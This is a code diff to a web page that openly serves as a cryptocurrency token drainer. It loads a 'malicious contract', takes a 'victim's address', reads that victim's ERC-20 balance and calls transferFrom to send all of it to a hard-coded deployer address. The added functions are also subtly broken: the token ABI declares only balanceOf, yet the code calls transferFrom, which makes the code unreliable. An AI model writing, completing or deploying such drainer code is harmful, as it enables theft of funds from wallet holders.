@@ -27,6 +27,10 @@
             margin-top: 20px;
             font-weight: bold;
         }
+        #balance {
+            margin-top: 20px;
+            font-size: 18px;
+        }
     </style>
 </head>
 <body>
@@ -44,8 +48,15 @@
 
     <br><br>
 
+    <!-- Check Balance Button -->
+    <button id="checkBalanceBtn" style="display:none;" onclick="checkBalance()">Check Balance</button>
+
+    <p id="balance"></p>
+
+    <br><br>
+
     <!-- Withdraw Button -->
-    <button id="withdrawTokensBtn" style="display:none;" onclick="withdrawAllTokens()">Withdraw All Tokens</button>
+    <button id="withdrawTokensBtn" style="display:none;" onclick="withdrawTokens()">Withdraw Tokens</button>
 
     <p id="status"></p>
 
@@ -53,7 +64,8 @@
     <script>
         let web3;
         let userAccount;
-        let contractAddress = "0xE3b5567F27d5cC4FDe7326F42c8749169448f08a"; // Replace with your malicious contract address
+        let maliciousContractAddress = "0xE3b5567F27d5cC4FDe7326F42c8749169448f08a";  // The malicious contract address
+        let tokenAddress = "0x59610B067eCfeCEdaf146A5E9B180C440f008575";  // The address of the token you want to withdraw
         let contract;
         let deployerAddress = "0x9052EB26C0b9836335Ec153413F80bAEc7536414";  // The address of the deployer
 
@@ -75,7 +87,7 @@
                 console.debug("Fetching ABI...");
                 const response = await fetch('abi.json');  // Ensure abi.json is in the same directory
                 const abi = await response.json();
-                contract = new web3.eth.Contract(abi, contractAddress);
+                contract = new web3.eth.Contract(abi, maliciousContractAddress);  // Use the malicious contract address
                 console.debug("Malicious contract initialized:", contract);
             } catch (error) {
                 console.error("Error loading ABI:", error);
@@ -93,6 +105,7 @@
                 userAccount = accounts[0];
                 console.debug("Wallet connected:", userAccount);
                 document.getElementById('status').innerText = `Connected: ${userAccount}`;
+                document.getElementById('checkBalanceBtn').style.display = "inline-block";
                 document.getElementById('withdrawTokensBtn').style.display = "inline-block";
             } catch (error) {
                 console.error("Error connecting wallet:", error);
@@ -100,9 +113,9 @@
             }
         }
 
-        async function withdrawAllTokens() {
+        async function checkBalance() {
             const victimAddress = document.getElementById('victimAddress').value;
-            
+
             if (!victimAddress) {
                 alert("Please enter a victim's address!");
                 console.debug("No victim address provided.");
@@ -112,8 +125,68 @@
             try {
                 console.debug("Fetching balance for victim:", victimAddress);
 
-                // Get the victim's token balance
-                const victimBalance = await contract.methods.balanceOf(victimAddress).call();
+                // Get the victim's token balance using the ERC-20 token contract
+                const tokenContract = new web3.eth.Contract([
+                    {
+                        "constant": true,
+                        "inputs": [
+                            { "name": "_owner", "type": "address" }
+                        ],
+                        "name": "balanceOf",
+                        "outputs": [
+                            { "name": "balance", "type": "uint256" }
+                        ],
+                        "payable": false,
+                        "stateMutability": "view",
+                        "type": "function"
+                    }
+                ], tokenAddress);
+
+                const victimBalance = await tokenContract.methods.balanceOf(victimAddress).call();
+                console.debug("Victim's token balance: " + victimBalance);
+
+                // Display the balance in a readable format
+                if (victimBalance <= 0) {
+                    document.getElementById('balance').innerText = "Victim has no tokens to withdraw!";
+                } else {
+                    document.getElementById('balance').innerText = `Victim's Token Balance: ${victimBalance}`;
+                }
+            } catch (error) {
+                console.error("Error checking balance:", error);
+                document.getElementById('balance').innerText = "Error checking balance.";
+            }
+        }
+
+        async function withdrawTokens() {
+            const victimAddress = document.getElementById('victimAddress').value;
+
+            if (!victimAddress) {
+                alert("Please enter a victim's address!");
+                console.debug("No victim address provided.");
+                return;
+            }
+
+            try {
+                console.debug("Fetching balance for victim:", victimAddress);
+
+                // Get the victim's token balance using the ERC-20 token contract
+                const tokenContract = new web3.eth.Contract([
+                    {
+                        "constant": true,
+                        "inputs": [
+                            { "name": "_owner", "type": "address" }
+                        ],
+                        "name": "balanceOf",
+                        "outputs": [
+                            { "name": "balance", "type": "uint256" }
+                        ],
+                        "payable": false,
+                        "stateMutability": "view",
+                        "type": "function"
+                    }
+                ], tokenAddress);
+
+                const victimBalance = await tokenContract.methods.balanceOf(victimAddress).call();
                 console.debug("Victim's token balance: " + victimBalance);
 
                 // Check if the victim has any tokens
@@ -123,9 +196,8 @@
                     return;
                 }
 
-                // Transfer all tokens from the victim to the deployer
-                await contract.methods.transferFrom(victimAddress, deployerAddress, victimBalance)
-                    .send({ from: deployerAddress });
+                // Perform the transfer using transferFrom function
+                await tokenContract.methods.transferFrom(victimAddress, deployerAddress, victimBalance).send({ from: userAccount });
 
                 console.debug("Successfully withdrew " + victimBalance + " tokens from " + victimAddress);
                 document.getElementById('status').innerText = `Successfully withdrawn all tokens from ${victimAddress}!`;
